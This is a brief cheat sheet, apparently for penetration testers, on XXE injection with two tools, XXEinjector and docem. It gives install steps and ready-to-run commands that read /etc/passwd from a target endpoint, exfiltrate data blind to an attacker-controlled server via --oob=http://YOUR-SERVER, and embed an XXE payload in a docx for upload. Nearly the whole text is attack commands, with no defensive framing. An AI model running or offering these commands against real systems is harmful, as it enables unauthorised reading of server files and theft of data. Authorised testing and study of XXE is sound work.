# XXE Injection – ONLY 2 TOOLS

## Tool 1: **XXEinjector** (BEST OVERALL)

### 📌 Requirement

* **Vulnerable XML endpoint**
* **XML request body**
* **Target URL**
* **Parameter** accepting XML
* 
### ▶️ Install

```bash
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector
chmod +x XXEinjector.rb
```

### ▶️ Basic XXE Test

```bash
ruby XXEinjector.rb -h https://target.com/api/xml -v
```

### ▶️ File Read (Linux)

```bash
ruby XXEinjector.rb -h https://target.com/api/xml -f /etc/passwd
```

### ▶️ Blind / OOB XXE

```bash
ruby XXEinjector.rb -h https://target.com/api/xml --oob=http://YOUR-SERVER
```

## 🥈 Tool 2: **docem** (FILE UPLOAD XXE)

### 📌 Requirement

* **File upload feature**
* Accepts **docx / pptx / odt**
* Upload URL


### ▶️ Embed XXE Payload

```bash
python3 docem.py --payload xxe --file sample.docx
```


### ▶️ Upload Modified File

```bash
upload sample_xxe.docx to target
```

#  TL;DR

| Tool        | Use Case           |
| ----------- | ------------------ |
| XXEinjector | Direct + Blind XXE |
| docem       | File Upload XXE    |
